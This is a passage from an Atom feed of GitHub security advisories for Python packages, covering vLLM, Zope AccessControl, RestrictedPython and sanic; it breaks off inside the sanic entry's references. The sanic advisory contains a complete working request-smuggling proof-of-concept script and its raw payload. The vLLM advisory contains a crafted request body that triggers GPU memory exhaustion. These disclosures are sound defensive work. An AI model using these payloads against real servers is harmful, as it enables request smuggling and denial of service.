<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-09-17T17:50:01.331Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[vllm] vLLM: Request-selected PyNvVideoCodec GPU decode bypasses static VRAM reservation]]></title>
        <id>https://github.com/advisories/GHSA-8pw2-6jv3-mj5j</id>
        <link href="https://github.com/advisories/GHSA-8pw2-6jv3-mj5j"/>
        <updated>2026-09-17T17:17:41.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Current vLLM <code>main</code> lets an inference request choose the PyNvVideoCodec GPU video decoder through <code>media_io_kwargs.video.video_backend</code>, but engine GPU memory reservation is computed only from static startup configuration and <code>VLLM_VIDEO_LOADER_BACKEND</code>. If the server starts with the default OpenCV/software backend and no <code>--mm-ipc-gpu-memory-gb</code> budget, a client can still route a video request into the PyNvVideoCodec path after startup, causing frontend CUDA-context, decoder-surface, and decoded-frame GPU allocations that were not carved out of the engine KV-cache budget.</p>
<h2 id="technical-details">Technical Details</h2>
<p>The vulnerable boundary is the split between request-time media decoding choices in the API server and startup-time memory budgeting in the engine worker. Request bodies for Chat Completions and Responses expose <code>media_io_kwargs</code>, and those values are forwarded to the shared media connector. For video inputs, <code>MediaConnector.fetch_video()</code> copies <code>self.media_io_kwargs["video"]</code> into <code>video_io_kwargs</code>, only setting a model-derived backend when <code>video_backend</code> is absent. <code>VideoMediaIO.__init__()</code> then consumes <code>video_backend</code> from those kwargs and loads that backend from <code>VIDEO_LOADER_REGISTRY</code>.</p>
<p>The relevant request-side source path is:</p>
<pre><code class="language-python">video_io_kwargs = dict(self.media_io_kwargs.get("video", {}))
if "video_backend" not in video_io_kwargs and (
    video_backend := get_video_loader_backend_for_processor(video_processor)
):
    video_io_kwargs["video_backend"] = video_backend
video_io = VideoMediaIO(image_io, **video_io_kwargs)
</code></pre>
<pre><code class="language-python">video_loader_backend = (
    kwargs.pop("video_backend", None) or envs.VLLM_VIDEO_LOADER_BACKEND
)
self.video_loader = VIDEO_LOADER_REGISTRY.load(video_loader_backend)
</code></pre>
<p><code>VideoBackend.load_bytes()</code> then dispatches <code>backend == "pynvvideocodec"</code> into <code>decode_frames_pynvvideocodec()</code>, which constructs a PyNvVideoCodec decoder, creates or uses a CUDA stream, reads stream metadata, decodes selected frames on the GPU, and copies those frames into pinned host memory. The new frontend GPU memory pool accounts only for raw decoded frame bytes when a pool exists; it does not make request-time backend selection safe when no startup reservation was made.</p>
<p>The engine-side reservation code makes its decision from static model config and environment only:</p>
<pre><code class="language-python">def _uses_pynvvideocodec_video_backend(mm_config) -&gt; bool:
    video_kwargs = mm_config.media_io_kwargs.get("video", {})
    video_loader_backend = (
        video_kwargs.get("video_backend") or envs.VLLM_VIDEO_LOADER_BACKEND
    )
    codec_backend = video_kwargs.get("backend")
    return (
        video_loader_backend == PYNVVIDEOCODEC_VIDEO_BACKEND
        or codec_backend == PYNVVIDEOCODEC_VIDEO_BACKEND
    )
</code></pre>
<pre><code class="language-python">decoder_reserved_bytes = (
    num_api_servers * per_server_decoder_bytes
    if self._uses_pynvvideocodec_video_backend(mm_config)
    else 0
)
reserved_bytes = raw_frame_reserved_bytes + decoder_reserved_bytes
if reserved_bytes &lt;= 0:
    return available_kv_cache_memory_bytes
</code></pre>
<p>With default static video configuration, <code>mm_config.media_io_kwargs["video"]</code> does not name PyNvVideoCodec and <code>VLLM_VIDEO_LOADER_BACKEND</code> defaults to OpenCV/software decoding. The worker therefore reserves no PyNv decoder/CUDA-context bytes. A later request can still set <code>media_io_kwargs.video.video_backend="pynvvideocodec"</code> and reach the GPU decoder path because that runtime field is intentionally honored by <code>VideoMediaIO</code>.</p>
<h2 id="pov">PoV</h2>
<p>An ordinary multimodal inference request can carry the backend override in the request body:</p>
<pre><code class="language-json">{
  "model": "served-vlm",
  "messages": [
    {
      "role": "user",
      "content": [
        {"type": "text", "text": "summarize this clip"},
        {"type": "video_url", "video_url": {"url": "data:video/mp4;base64,&lt;small-mp4&gt;"}}
      ]
    }
  ],
  "media_io_kwargs": {
    "video": {
      "video_backend": "pynvvideocodec"
    }
  }
}
</code></pre>
<p>The following bounded source-level check confirms the code path without allocating GPU memory:</p>
<pre><code class="language-bash">git clone --filter=blob:none https://github.com/vllm-project/vllm.git
cd vllm
git checkout ddd3855a28a561a5bb54d380c6e6b8b1e883cc4a
python3 check_pynv_backend_reservation.py --repo .
</code></pre>
<h2 id="poc">PoC</h2>
<p>The bounded check validates current source markers, simulates the exact static reservation predicate, and compares vulnerable and negative-control configurations. Key output:</p>
<pre><code class="language-json">{
  "vulnerable": true,
  "head": "ddd3855a28a561a5bb54d380c6e6b8b1e883cc4a",
  "reservation_simulation": {
    "env_video_loader_backend": "opencv",
    "request_selects_pynv_after_startup": true,
    "vulnerable_static_reserved_bytes": 0,
    "negative_control_static_pynv_reserved_bytes": 2066953011,
    "raw_frame_only_control_reserved_bytes": 268435456,
    "unreserved_decoder_bytes_when_only_request_selects_pynv": 2066953011
  }
}
</code></pre>
<p>The negative control is important: when PyNvVideoCodec is selected statically, the worker reserves <code>2066953011</code> bytes per API process for decoder surfaces plus CUDA context. The vulnerable case reserves <code>0</code> bytes for the same decoder overhead because PyNvVideoCodec is selected only by the later request. A second control with static OpenCV plus <code>mm_ipc_gpu_memory_gb=0.25</code> reserves only the raw-frame semaphore budget and still does not reserve PyNv decoder/CUDA-context bytes.</p>
<h2 id="impact">Impact</h2>
<p>An attacker who can submit video requests to a vLLM deployment with PyNvVideoCodec available can force frontend GPU decoding even when the engine did not reserve memory for that decoder during startup. On high-utilization serving deployments, the unreserved CUDA context, retained decoder surfaces, and decoded-frame allocations can reduce or exhaust GPU memory that the engine assumed was available for weights, activations, or KV cache, causing request failures, worker crashes, or service-level denial of service.</p>
<p>Suggested severity is Medium with conservative CVSS v3.1 <code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H</code> (6.5). If a deployment exposes the affected API without authentication, <code>PR:N</code> would raise the deployment-specific score. Suggested weaknesses are <code>CWE-770</code> (Allocation of Resources Without Limits or Throttling) and <code>CWE-400</code> (Uncontrolled Resource Consumption). This should not be rated Low because the affected resource is shared GPU memory in the serving path and the code already treats the PyNv decoder/CUDA-context footprint as large enough to reserve at startup when statically configured.</p>
<p>Limitations: exploitation requires a GPU deployment where PyNvVideoCodec is installed and usable, and the request must reach a video-capable model/path. The issue does not claim code execution, data disclosure, or SSRF.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Do not allow untrusted request fields to select a GPU decoder that was not included in startup memory reservation. The simplest fix is to reject request-level <code>media_io_kwargs.video.video_backend="pynvvideocodec"</code> unless the static server configuration already selected PyNvVideoCodec and reserved its decoder/CUDA-context budget.</p>
<p>If dynamic backend selection remains supported, split software and GPU decoder policies: allow request selection among CPU/software decoders only, require an explicit operator allowlist for GPU decoders, and include every request-selectable GPU decoder in the startup reservation predicate. Add regression coverage for static OpenCV startup config plus request-level PyNvVideoCodec override, and preserve the negative control where static PyNvVideoCodec configuration reserves decoder/CUDA-context bytes.</p>
<h2 id="affected-packageversions">Affected Package/Versions</h2>
<p>Package: <code>vllm</code> from <code>vllm-project/vllm</code>.</p>
<p>Confirmed affected: current <code>main</code> at <code>ddd3855a28a561a5bb54d380c6e6b8b1e883cc4a</code>.</p>
<p>Introduced by: <code>af16446bf39de047ab57649c933063cf1cbf1e50</code>, <code>Vram semaphore infra (#44465)</code>, committed 2026-06-26T17:32:51-07:00.</p>
<p>Release status checked: <code>git tag --contains af16446bf</code> returned no release tags in the fresh checkout. GitHub repository metadata reported latest published release <code>v0.23.0</code> published 2026-06-15T05:27:20Z; the local <code>v0.24.0</code> tag also does not contain the introducing commit. The affected range should therefore be current <code>main</code> builds containing <code>af16446bf</code> until fixed, rather than a confirmed released-version range.</p>
<h2 id="advisory-history">Advisory History</h2>
<p>Public vLLM advisories checked included audio decompression-bomb DoS, unbounded <code>video/jpeg</code> frame-count DoS, MediaConnector SSRF, video processing RCE, multimodal embedding DoS/RCE, GGUF GPU memory exposure, multimodal hashing, and other request-parameter DoS classes. None matched request-selected PyNvVideoCodec or the static VRAM reservation mismatch.</p>
<p>Prior local/private vLLM report families checked included request-level <code>media_io_kwargs</code> reopening <code>video/jpeg</code> frame fanout, GLM video metadata amplification, and audio media decode duration-limit bypass. Those reports share the request-level media kwargs boundary, but they target CPU/media decode limits or model metadata amplification. This report targets a different privileged asset and fix surface: GPU decoder selection after engine startup memory reservation.</p>
<p>Focused GitHub issue/PR searches for <code>pynvvideocodec</code>, <code>mm_ipc_gpu_memory</code>, <code>video_backend media_io_kwargs</code>, <code>Vram semaphore infra</code>, and <code>frontend multimodal GPU decoding</code> found the PyNvVideoCodec zero-copy RFC, an old do-not-review prototype, merged PR <code>#44465</code>, and an unrelated TorchCodec backend PR. No public issue or PR described this security boundary.</p>
<h2 id="appendix-bounded-source-level-check">Appendix: Bounded Source-Level Check</h2>
<pre><code class="language-python">#!/usr/bin/env python3
from __future__ import annotations

import argparse
import json
import re
import subprocess
from pathlib import Path

MIB = 1024 * 1024
GIB = 1024 * MIB

def read(repo: Path, rel: str) -&gt; str:
    return (repo / rel).read_text(encoding="utf-8")

def const_int(source: str, name: str) -&gt; int:
    expr = re.search(rf"^{name}\s*=\s*(.+)$", source, flags=re.MULTILINE).group(1).strip()
    if expr == "128 * MiB_bytes":
        return 128 * MIB
    if expr == "int(1.8 * 1024 * MiB_bytes)":
        return int(1.8 * 1024 * MIB)
    if expr == "1":
        return 1
    raise AssertionError(expr)

def uses_pynv_static(static_media_io_kwargs: dict[str, dict[str, str]], env_backend: str) -&gt; bool:
    video_kwargs = static_media_io_kwargs.get("video", {})
    video_loader_backend = video_kwargs.get("video_backend") or env_backend
    codec_backend = video_kwargs.get("backend")
    return video_loader_backend == "pynvvideocodec" or codec_backend == "pynvvideocodec"

def reserve_bytes(static_media_io_kwargs, env_backend, mm_ipc_gpu_memory_gb, decoder_bytes, cuda_context_bytes, retained_decoders):
    raw_frame_reserved_bytes = int(mm_ipc_gpu_memory_gb * GIB)
    per_server_decoder_bytes = decoder_bytes * retained_decoders + cuda_context_bytes
    decoder_reserved_bytes = per_server_decoder_bytes if uses_pynv_static(static_media_io_kwargs, env_backend) else 0
    return raw_frame_reserved_bytes + decoder_reserved_bytes

parser = argparse.ArgumentParser()
parser.add_argument("--repo", required=True, type=Path)
repo = parser.parse_args().repo.resolve()

media_video = read(repo, "vllm/multimodal/media/video.py")
connector = read(repo, "vllm/multimodal/media/connector.py")
chat_protocol = read(repo, "vllm/entrypoints/openai/chat_completion/protocol.py")
responses_protocol = read(repo, "vllm/entrypoints/openai/responses/protocol.py")
gpu_worker = read(repo, "vllm/v1/worker/gpu_worker.py")
video_core = read(repo, "vllm/multimodal/video.py")

assert "media_io_kwargs: dict[str, dict[str, Any]] | None = Field(" in chat_protocol
assert "media_io_kwargs: dict[str, dict[str, Any]] | None = Field(" in responses_protocol
assert 'video_io_kwargs = dict(self.media_io_kwargs.get("video", {}))' in connector
assert 'if "video_backend" not in video_io_kwargs and (' in connector
assert 'kwargs.pop("video_backend", None) or envs.VLLM_VIDEO_LOADER_BACKEND' in media_video
assert "elif backend == PYNVVIDEOCODEC_VIDEO_BACKEND:" in video_core
assert 'video_kwargs = mm_config.media_io_kwargs.get("video", {})' in gpu_worker

decoder_bytes = const_int(video_core, "PYNVVIDEOCODEC_DECODER_GPU_MEMORY_BYTES")
retained_decoders = const_int(video_core, "PYNVVIDEOCODEC_MAX_RETAINED_DECODERS")
cuda_context_bytes = const_int(video_core, "PYNVVIDEOCODEC_CUDA_CONTEXT_BYTES")
per_server_decoder_bytes = decoder_bytes * retained_decoders + cuda_context_bytes

vulnerable_static_reserved = reserve_bytes({}, "opencv", 0.0, decoder_bytes, cuda_context_bytes, retained_decoders)
negative_control_reserved = reserve_bytes({"video": {"video_backend": "pynvvideocodec"}}, "opencv", 0.0, decoder_bytes, cuda_context_bytes, retained_decoders)
raw_frame_only_control = reserve_bytes({}, "opencv", 0.25, decoder_bytes, cuda_context_bytes, retained_decoders)

head = subprocess.check_output(["git", "-C", str(repo), "rev-parse", "HEAD"], text=True).strip()
print(json.dumps({
    "head": head,
    "vulnerable": vulnerable_static_reserved == 0 and negative_control_reserved == per_server_decoder_bytes,
    "reservation_simulation": {
        "env_video_loader_backend": "opencv",
        "request_selects_pynv_after_startup": True,
        "vulnerable_static_reserved_bytes": vulnerable_static_reserved,
        "negative_control_static_pynv_reserved_bytes": negative_control_reserved,
        "raw_frame_only_control_reserved_bytes": raw_frame_only_control,
        "unreserved_decoder_bytes_when_only_request_selects_pynv": per_server_decoder_bytes,
    },
}, indent=2, sort_keys=True))
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-8pw2-6jv3-mj5j">https://github.com/vllm-project/vllm/security/advisories/GHSA-8pw2-6jv3-mj5j</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-69147">https://nvd.nist.gov/vuln/detail/CVE-2026-69147</a></li>
<li><a href="https://github.com/vllm-project/vllm/pull/47259">https://github.com/vllm-project/vllm/pull/47259</a></li>
<li><a href="https://github.com/vllm-project/vllm/commit/283893c72292ede38d277e3cd2b9b64c3e4f1dda">https://github.com/vllm-project/vllm/commit/283893c72292ede38d277e3cd2b9b64c3e4f1dda</a></li>
<li><a href="https://github.com/vllm-project/vllm/commit/ba22152096b2484faa3579624a253d54804d876d">https://github.com/vllm-project/vllm/commit/ba22152096b2484faa3579624a253d54804d876d</a></li>
<li><a href="https://github.com/vllm-project/vllm/releases/tag/v0.25.0">https://github.com/vllm-project/vllm/releases/tag/v0.25.0</a></li>
<li><a href="https://github.com/advisories/GHSA-8pw2-6jv3-mj5j">https://github.com/advisories/GHSA-8pw2-6jv3-mj5j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8pw2-6jv3-mj5j</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-17T17:17:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[AccessControl] Zope AccessControl vulnerable to information disclosure through Python string `format` and `format_map` functions]]></title>
        <id>https://github.com/advisories/GHSA-pq59-9fq7-m886</id>
        <link href="https://github.com/advisories/GHSA-pq59-9fq7-m886"/>
        <updated>2026-09-17T16:30:38.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Python's string <code>format</code> functionality allows someone controlling the format string to "read" objects accessible (recursively) via attribute access and subscription from accessible objects. Those attribute accesses and subscriptions use Python's full blown <code>getattr</code> and <code>getitem</code>, not the policy restricted <code>AccessControl</code> variants <code>_getattr_</code> and <code>_getitem_</code>. This can lead to critical information disclosure.</p>
<p>The <code>AccessControl</code> package already guards against direct access to the formatting functions on string instances, but these mitigations did not cover subclasses of <code>str</code>.</p>
<p>Affected are all users who allow untrusted users to create AccessControl controlled Python code and execute it.</p>
<h3 id="patches">Patches</h3>
<p>A fix was published with version 7.4.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/zopefoundation/AccessControl/security/advisories/GHSA-pq59-9fq7-m886">https://github.com/zopefoundation/AccessControl/security/advisories/GHSA-pq59-9fq7-m886</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-77401">https://nvd.nist.gov/vuln/detail/CVE-2026-77401</a></li>
<li><a href="https://github.com/zopefoundation/AccessControl/commit/f980450eea416718be62847f34dfd51822938e43">https://github.com/zopefoundation/AccessControl/commit/f980450eea416718be62847f34dfd51822938e43</a></li>
<li><a href="https://github.com/zopefoundation/AccessControl/releases/tag/7.4">https://github.com/zopefoundation/AccessControl/releases/tag/7.4</a></li>
<li><a href="https://github.com/advisories/GHSA-pq59-9fq7-m886">https://github.com/advisories/GHSA-pq59-9fq7-m886</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pq59-9fq7-m886</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-17T16:30:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[RestrictedPython] RestrictedPython vulnerable to sandbox escape via string.Formatter field resolution]]></title>
        <id>https://github.com/advisories/GHSA-hp3v-5vw7-fx9w</id>
        <link href="https://github.com/advisories/GHSA-hp3v-5vw7-fx9w"/>
        <updated>2026-09-17T16:30:23.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>RestrictedPython could allow a sandbox escape when a policy exposes the standard library <code>string</code> module, or otherwise exposes <code>string.Formatter</code>, to restricted code.</p>
<p><code>string.Formatter</code> field resolution methods such as <code>get_field</code> can perform attribute and item traversal internally and return live object references. This can bypass RestrictedPython's normal attribute guards and may allow access to sensitive objects such as function globals, builtins, file access, or code execution primitives.</p>
<p>Users are impacted if they run untrusted code with RestrictedPython and expose <code>string.Formatter</code>, directly or indirectly, for example through a custom import policy or globals.</p>
<h3 id="patches">Patches</h3>
<p>The problem has been patched by blocking access to <code>string.Formatter</code> and unsafe <code>string.Formatter</code> traversal methods in <code>safer_getattr</code>.</p>
<p>Users should upgrade to the patched release once available. Affected and patched version numbers should be filled in when the release is published.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Do not expose the standard library <code>string</code> module or <code>string.Formatter</code> to restricted code.</p>
<p>If a custom import hook is used, deny imports of <code>string</code> or provide only a restricted wrapper that does not expose <code>Formatter</code>. If custom globals are supplied, ensure neither <code>string.Formatter</code> nor <code>Formatter</code> instances are available to restricted code.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/zopefoundation/RestrictedPython/security/advisories/GHSA-hp3v-5vw7-fx9w">https://github.com/zopefoundation/RestrictedPython/security/advisories/GHSA-hp3v-5vw7-fx9w</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-76825">https://nvd.nist.gov/vuln/detail/CVE-2026-76825</a></li>
<li><a href="https://github.com/zopefoundation/RestrictedPython/commit/3b47440070b91f8807c2b2998aca99e94783639a">https://github.com/zopefoundation/RestrictedPython/commit/3b47440070b91f8807c2b2998aca99e94783639a</a></li>
<li><a href="https://github.com/zopefoundation/RestrictedPython/releases/tag/8.4">https://github.com/zopefoundation/RestrictedPython/releases/tag/8.4</a></li>
<li><a href="https://github.com/advisories/GHSA-hp3v-5vw7-fx9w">https://github.com/advisories/GHSA-hp3v-5vw7-fx9w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hp3v-5vw7-fx9w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-17T16:30:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sanic] sanic chunked trailer request smuggling allows hidden second request execution]]></title>
        <id>https://github.com/advisories/GHSA-wmj6-g64g-j7q5</id>
        <link href="https://github.com/advisories/GHSA-wmj6-g64g-j7q5"/>
        <updated>2026-09-17T14:59:18.000Z</updated>
        <content type="html"><![CDATA[<h2 id="description">Description</h2>
<p>Sanic's HTTP/1.1 chunked-body handling does not fully consume the <code>trailer-part</code> after the terminating <code>0\r\n</code> chunk. Because of that, attacker-controlled bytes left in the connection buffer after the first chunked request can be interpreted as the start of a new HTTP request on the same keep-alive connection. In the attached verified proof, a single outer <code>POST /</code> request that correctly returns <code>405 Method Not Allowed</code> is followed, within the same TCP send, by a hidden second request smuggled through the chunked trailer area. Sanic parses and executes that second request as a real independent request.</p>
<p>The issue is a request-boundary integrity failure in Sanic's core HTTP/1.1 parser. The verified impact is not speculative. The attached proof shows that one TCP payload produces two server responses: first the expected <code>405</code> for the outer <code>POST /</code>, then a separate <code>200 OK</code> for a hidden <code>GET /</code>. A second exploit variant changes the hidden request path and receives a real <code>404 Not Found</code>, proving that the hidden second request is not a hard-coded artifact but an actually routed backend request. A control case with a two-character trailer field name shifts the leftover bytes from <code>GET</code> to <code>:GET</code>, which changes the second response accordingly and confirms that the root cause is incorrect trailer consumption rather than legitimate pipelining.</p>
<h2 id="steps-to-reproduce">Steps To Reproduce</h2>
<ol>
<li>Start a Sanic HTTP/1.1 service on a keep-alive connection path. In the verified run, the local target listened on <code>127.0.0.1:9381</code> and the root route allowed <code>GET /</code> but not <code>POST /</code>.</li>
<li>From the package root, run the provided PoC:</li>
</ol>
<pre><code class="language-bash">python3 evidence/vuln_001_chunked_trailer_smuggle.py | tee evidence/vuln_001_chunked_trailer_smuggle.run.txt
</code></pre>
<ol start="3">
<li>Review the baseline case in <code>evidence/vuln_001_chunked_trailer_smuggle.run.txt</code>. A normal chunked request with <code>0\r\n\r\n</code> returns exactly one response block:</li>
</ol>
<pre><code class="language-text">=== CASE: baseline_no_trailer ===
Received response blocks: 1
HTTP/1.1 405 Method Not Allowed
</code></pre>
<ol start="4">
<li>Review the exploit case that hides <code>GET /</code> in the trailer area:</li>
</ol>
<pre><code class="language-text">=== CASE: exploit_smuggled_root ===
</code></pre>
<p>The PoC sends a single TCP payload containing:</p>
<pre><code class="language-text">POST / HTTP/1.1
Host: 127.0.0.1:9381
Connection: keep-alive
Transfer-Encoding: chunked

1
X
0
a:GET / HTTP/1.1
Host: 127.0.0.1:9381
</code></pre>
<ol start="5">
<li>Confirm that Sanic returns two response blocks from that one send:</li>
</ol>
<pre><code class="language-text">Received response blocks: 2
HTTP/1.1 405 Method Not Allowed
...
HTTP/1.1 200 OK
...
{"test":true}
</code></pre>
<ol start="6">
<li>Review the second exploit case that changes the smuggled request path to a nonexistent route:</li>
</ol>
<pre><code class="language-text">=== CASE: exploit_smuggled_404 ===
</code></pre>
<p>Confirm that Sanic again returns two response blocks and that the second response is a real routed <code>404 Not Found</code> for the attacker-controlled hidden path.
7. Review the control case with a two-character trailer field name:</p>
<pre><code class="language-text">=== CASE: offset_control_two_char_field_name ===
</code></pre>
<p>Confirm that the second request is now interpreted as <code>:GET /</code>, producing a second <code>405</code> with <code>Method :GET not allowed for URL /</code>. This demonstrates that the leftover bytes begin at a parser offset inside the trailer region and are then reinterpreted as a new request line.</p>
<h2 id="recommendations">Recommendations</h2>
<p>After parsing the terminating <code>0</code> chunk, Sanic must continue parsing and fully consuming the <code>trailer-part</code> until the final empty line before the connection buffer is reused. If trailer support is not intended, the safer behavior is to reject any request that contains bytes after the terminating <code>0\r\n</code> other than the expected final empty line, and then close the connection instead of keeping it alive.</p>
<p>Add regression coverage for all three cases shown in the evidence: a normal <code>0\r\n\r\n</code> chunked termination, a legal trailer that must be fully consumed, and a malicious trailer that must never cause a second backend request to be parsed. The fix needs to guarantee that no bytes from trailer processing can remain in the buffer as a candidate next request.</p>
<h2 id="poc">poc</h2>
<pre><code class="language-python">#!/usr/bin/env python3
"""Proof of concept for HTTP/1.1 chunked trailer request injection."""

from __future__ import annotations

import socket
from dataclasses import dataclass
from typing import Iterable


TARGET = "sanic-org/sanic"
BASE_URL = "http://127.0.0.1:9381"
HOST = "127.0.0.1"
PORT = 9381
TIMEOUT = 1.0
PROXY = None
AUTH_HEADERS: dict[str, str] = {}


@dataclass
class Case:
    name: str
    payload: bytes
    expected_responses: int
    expected_markers: tuple[bytes, ...]


def build_prefix() -&gt; bytes:
    return (
        b"POST / HTTP/1.1\r\n"
        + f"Host: {HOST}:{PORT}\r\n".encode()
        + b"Connection: keep-alive\r\n"
        + b"Transfer-Encoding: chunked\r\n"
        + b"\r\n"
        + b"1\r\n"
        + b"X\r\n"
    )


def build_case_payload(path: str | None = None, field_name: str = "a") -&gt; bytes:
    prefix = build_prefix()
    if path is None:
        return prefix + b"0\r\n\r\n"
    return (
        prefix
        + b"0\r\n"
        + f"{field_name}:GET {path} HTTP/1.1\r\n".encode()
        + f"Host: {HOST}:{PORT}\r\n".encode()
        + b"\r\n"
    )


def send_payload(payload: bytes) -&gt; bytes:
    response = bytearray()
    with socket.create_connection((HOST, PORT), timeout=3) as sock:
        sock.sendall(payload)
        sock.settimeout(TIMEOUT)
        while True:
            try:
                chunk = sock.recv(4096)
            except TimeoutError:
                break
            if not chunk:
                break
            response.extend(chunk)
    return bytes(response)


def count_http_responses(response: bytes) -&gt; int:
    return response.count(b"HTTP/1.1 ")


def ensure_markers(case: Case, response: bytes) -&gt; None:
    actual_count = count_http_responses(response)
    if actual_count != case.expected_responses:
        raise SystemExit(
            f"[FAIL] {case.name}: expected {case.expected_responses} responses, got {actual_count}"
        )
    for marker in case.expected_markers:
        if marker not in response:
            raise SystemExit(
                f"[FAIL] {case.name}: missing marker {marker.decode('latin1', 'replace')}"
            )


def render_payload(payload: bytes) -&gt; str:
    return payload.decode("latin1", "replace")


def render_response(response: bytes) -&gt; str:
    return response.decode("latin1", "replace")


def iter_cases() -&gt; Iterable[Case]:
    yield Case(
        name="baseline_no_trailer",
        payload=build_case_payload(),
        expected_responses=1,
        expected_markers=(
            b"HTTP/1.1 405 Method Not Allowed",
            b"Method POST not allowed for URL /",
        ),
    )
    yield Case(
        name="exploit_smuggled_root",
        payload=build_case_payload("/"),
        expected_responses=2,
        expected_markers=(
            b"HTTP/1.1 405 Method Not Allowed",
            b"HTTP/1.1 200 OK",
            b'{"test":true}',
        ),
    )
    yield Case(
        name="exploit_smuggled_404",
        payload=build_case_payload("/this-path-should-not-exist"),
        expected_responses=2,
        expected_markers=(
            b"HTTP/1.1 405 Method Not Allowed",
            b"HTTP/1.1 404 Not Found",
            b"Requested URL /this-path-should-not-exist not found",
        ),
    )
    yield Case(
        name="offset_control_two_char_field_name",
        payload=build_case_payload("/", field_name="ab"),
        expected_responses=2,
        expected_markers=(
            b"HTTP/1.1 405 Method Not Allowed",
            b"Method :GET not allowed for URL /",
        ),
    )


def main() -&gt; None:
    print(f"Target: {TARGET}")
    print(f"Base URL: {BASE_URL}")
    print()
    for case in iter_cases():
        print(f"=== CASE: {case.name} ===")
        print("Sent payload:")
        print(render_payload(case.payload))
        response = send_payload(case.payload)
        ensure_markers(case, response)
        print(f"Received response blocks: {count_http_responses(response)}")
        print("Raw response:")
        print(render_response(response))
        print("[OK] Case verified")
        print()


if __name__ == "__main__":
    main()
</code></pre>
<h2 id="evidence-files">Evidence Files</h2>
<p>The attachment package includes the exact PoC and the full runtime output from the verified local execution.</p>
<ul>
<li><code>evidence/vuln_001_chunked_trailer_smuggle.py</code>: full PoC used for the verified run.</li>
<li><code>evidence/vuln_001_chunked_trailer_smuggle.run.txt</code>: runtime output showing the baseline behavior, the successful smuggled <code>GET /</code> execution, the successful smuggled <code>GET /this-path-should-not-exist</code> execution, and the trailer-offset control case.</li>
</ul>
<p>Observed baseline behavior:</p>
<pre><code class="language-text">=== CASE: baseline_no_trailer ===
Received response blocks: 1
Raw response:
HTTP/1.1 405 Method Not Allowed
...
Method POST not allowed for URL /
</code></pre>
<p>Observed hidden second request execution:</p>
<pre><code class="language-text">=== CASE: exploit_smuggled_root ===
Received response blocks: 2
Raw response:
HTTP/1.1 405 Method Not Allowed
...
Method POST not allowed for URL /

HTTP/1.1 200 OK
...
{"test":true}
</code></pre>
<p>Observed hidden attacker-controlled path execution:</p>
<pre><code class="language-text">=== CASE: exploit_smuggled_404 ===
Received response blocks: 2
Raw response:
HTTP/1.1 405 Method Not Allowed
...
Method POST not allowed for URL /

HTTP/1.1 404 Not Found
...
Requested URL /this-path-should-not-exist not found
</code></pre>
<p>Observed trailer-offset control:</p>
<pre><code class="language-text">=== CASE: offset_control_two_char_field_name ===
Received response blocks: 2
Raw response:
HTTP/1.1 405 Method Not Allowed
...
Method POST not allowed for URL /

HTTP/1.1 405 Method Not Allowed
...
Method :GET not allowed for URL /
</code></pre>
<h2 id="impact">Impact</h2>
<p>An attacker who can send a chunked HTTP/1.1 request to a Sanic backend can cause the backend to interpret bytes from the trailer region as a second request on the same keep-alive connection. In the verified proof, that second request was fully routed and executed by the backend even though only one outer request was sent by the client.</p>
<p>This breaks the integrity of HTTP request boundaries inside the server. In real deployments that place Sanic behind reverse proxies, gateways, caches, or other intermediaries, a backend parser mismatch of this kind can become a request smuggling primitive with broader security consequences than the local proof route demonstrates.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sanic-org/sanic/security/advisories/GHSA-wmj6-g64g-j7q5">https://github.com/sanic-org/sanic/security/advisories/GHSA-wmj6-g64g-j7q5</a></li>
<li><a href="https://github.com/sanic-org/sanic/pull/3164">https://github.com/sanic-org/sanic/pull/3164</a></li>
<li><a href="https://github.com/sanic-org/sanic/pull/3165">https://github.com/sanic-org/sanic/pull/3165</a></li>
<li><a href="https://github.com/sanic-org/sanic/commit/47349d689d65fa1907977ac100e867894aeafb22">https://github.com/sanic-org/sanic/commit/47349d689d65fa1907977ac100e867894aeafb22</a></li>
<li><a href="https://github.com/sanic-org/sanic/commit/69a10d3b06babaa9e5f6d1af577364e9e53b6dea">https://github.com/sanic-org/sanic/commit/69a10d3b06babaa9e5f6d1af577364e9e53b6dea</a></li>
